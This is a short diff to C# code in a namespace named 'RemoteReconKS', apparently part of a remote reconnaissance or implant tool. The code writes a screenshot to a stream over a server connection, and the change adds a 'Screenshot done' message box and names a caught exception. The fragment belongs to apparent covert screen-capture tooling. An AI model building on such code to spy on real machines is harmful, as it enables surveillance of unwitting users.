@@ -36,10 +36,10 @@ namespace RemoteReconKS
                     sw.WriteLine(screenshot());
                     Thread.Sleep(5000);
                     sw.Flush();
-
+                    MessageBox.Show("Screenshot done");
                     server.Close();
                 }
-                catch (Exception)
+                catch (Exception e)
                 {
 #if DEBUG
                     File.AppendAllText(logpath, e.ToString());
